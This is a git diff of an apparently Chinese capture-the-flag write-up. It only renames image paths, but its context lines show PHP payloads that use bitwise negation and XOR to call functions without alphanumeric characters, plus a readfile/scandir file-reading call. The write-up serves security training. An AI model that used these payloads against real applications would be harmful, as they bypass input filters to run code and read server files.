@@ -39,7 +39,7 @@ phpinfo取反为%8F%97%8F%96%91%99%90，PHP7函数执行`(~%8F%97%8F%96%91%99%90
 
 看到disable\_functions
 
-![](<../.gitbook/assets/image (1) (1) (1).png>)
+![](<../.gitbook/assets/image (1) (1) (1) (1).png>)
 
 但是有字符使用的限制，所以还是要考虑其他方式。以前p牛说过无字符getshell可以用自增、位运算和取反，再偷一波陆队的思路。
 
@@ -171,7 +171,7 @@ d %9b^%ff
 (%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff)));
 ```
 
-![](<../.gitbook/assets/image (13).png>)
+![](<../.gitbook/assets/image (13) (1).png>)
 
 `readfile(end(scandir('.')))`
 
